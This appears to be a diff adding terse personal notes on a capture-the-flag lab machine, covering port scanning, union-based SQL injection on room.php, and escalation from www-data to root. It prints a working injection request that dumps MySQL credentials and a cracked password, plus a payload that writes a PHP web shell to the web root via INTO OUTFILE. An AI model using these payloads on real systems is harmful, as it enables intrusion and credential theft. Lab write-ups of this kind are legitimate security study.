@@ -1,0 +1,64 @@
+OS:
+- Debian
+
+Open Ports:
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+64999/tcp open  unknown
+
+- enumerating port 80
+- found hostnames: 
+supersecurehotel@logger.htb
+supersecurehotel.htb
+
+- added both to /etc/hosts
+- unable to run dir scans, getting timeout
+- noticed website with the following URL:
+http://10.10.10.143/room.php?cod=1
+
+- changed last digit to 2-1, results in the same page, which means SQL queries are taking place
+- using UNION to return SQL queries. 7 select statements on the left
+- getting mySQL version:
+10.1.37-MariaDB-0+deb9u1
+
+- db list:
+hotel
+information_schema
+mysql
+performance_schema
+
+tables:columns in hotel db:
+room:cod
+room:name
+room:price
+room:descrip
+room:star
+room:image
+room:mini
+
+listed all tables:columns in mysql
+
+- got creds from mysql.user (GET Request: GET /room.php?cod=9999 UNION SELECT "1","2",(SELECT group_concat(host,":",user,":",password,"\r\n") FROM mysql.user),"4","5","6","7" HTTP/1.1)
+localhost:DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+
+- using hashcat to crack hash
+- creds: dbadmin:imissyou
+
+- log onto phpmyadmin
+- searching for exploit for version: 4.8
+- found RCE exploit
+- trying to exploit using SQL injection instead
+UNION SELECT "1","2",(SELECT '<?php system($_REQUEST["bd"]); ?>'),"4","5","6","7" INTO OUTFILE '/var/www/html/exec.php'
+
+- file uploaded to home dir
+- got RCE. created reverse shell
+- logged on as www-data
+- user is able to run python script as root
+- has list of unavailable characters. $ is not one of them
+- used $(bash /tmp/reverscript)
+- logged in as user papper
+- looking for files with setuid and user root
+- systemctl
+- using gtfobins to run priv esc cmds
+- got root access
